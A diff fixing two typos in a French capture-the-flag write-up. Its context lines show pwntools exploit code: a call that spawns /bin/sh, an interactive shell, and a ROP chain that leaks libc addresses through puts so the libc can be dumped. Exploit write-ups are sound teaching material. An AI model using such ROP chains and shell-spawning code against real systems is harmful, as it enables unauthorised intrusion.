@@ -135,11 +135,11 @@ getsystem("/bin/sh")
 p.interactive()
 ```
 
-Souci: cette fameuse adresse system. La libc n'est pas dans la libc-database, il faut donc faire un dump de cette libc. Mais la connexion n'est pas fameuse, le mieux est de boucler en conservant le plus possible la connexion (qui coupe au bout de 30s). On va donc boucler en switchant entre de pile: Ce sont les deux fonctions getadd1 et getadd2 qui font cela:
+Souci: cette fameuse adresse system. La libc n'est pas dans la libc-database, il faut donc faire un dump de cette libc. Mais la connexion n'est pas fameuse, le mieux est de boucler en conservant le plus possible la connexion (qui coupe au bout de 30s). On va donc boucler en switchant entre deux piles: Ce sont les deux fonctions getadd1 et getadd2 qui font cela:
 ```
 def getadd1(adr):
     chaine=p32(pile)
-    chaine+=p32(puts_plt)	<--- affiche deductibe
+    chaine+=p32(puts_plt)	<--- affiche deductible
     chaine+=p32(pop1)
     chaine+=p32(deductible)
     chaine+=p32(puts_plt)	<--- lit adr jusqu'au premier 00
